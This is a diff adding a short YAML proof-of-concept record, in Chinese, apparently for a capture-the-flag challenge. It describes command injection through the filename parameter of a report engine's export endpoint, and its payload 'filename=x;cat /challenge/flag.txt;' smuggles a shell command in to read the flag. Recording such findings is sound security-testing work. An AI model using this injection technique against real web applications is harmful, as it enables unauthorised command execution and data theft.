@@ -1,0 +1,18 @@
+info:
+  name: report_engine_export_cmd_injection
+  cve: ''
+  summary: 报表引擎 export 功能 filename 参数命令注入，可执行任意命令读取 flag
+  severity: medium
+  affected: ''
+  references: []
+poc:
+  type: exploit
+  principle: 报表引擎 export 功能 filename 参数命令注入，可执行任意命令读取 flag
+  steps:
+  - 1. 登录获取会话 cookie
+  - 2. POST /api.php?action=export，参数 report_id=2&filename=<命令注入payload>
+  - 3. filename 被拼入 shell 命令 `echo '...' > /var/www/html/uploads/{filename}.txt 2>&1`
+  - 4. 用 `;cmd;` 注入任意命令，输出在 debug.output 中返回
+  - 5. 读 /challenge/flag.txt 拿到 flag
+  payload: 'POST /api.php?action=export  body: report_id=2&filename=x;cat /challenge/flag.txt;'
+  verification: 报表引擎 export 功能 filename 参数命令注入，可执行任意命令读取 flag
